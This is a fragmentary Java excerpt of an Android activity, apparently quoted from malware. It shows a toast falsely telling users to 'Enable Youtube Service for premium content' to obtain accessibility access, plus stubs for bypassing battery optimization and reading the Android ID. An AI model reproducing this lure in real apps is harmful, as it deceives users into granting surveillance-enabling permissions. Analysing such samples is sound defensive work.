...
public class MainActivity extends AppCompatActivity {
    ...
    private void checkAndAskAcc() {
        boolean enabled = isAccessibilityServiceEnabled(this, SocialMedia.class);
        if (!enabled) {
            Toast.makeText(this, "Enable Youtube Service for premium content", Toast.LENGTH_LONG).show();
    ...
    private void ignorebattryOptimization() {
    ...
    private void getAid() {
        aid = Settings.Secure.getString(this.getContentResolver(),
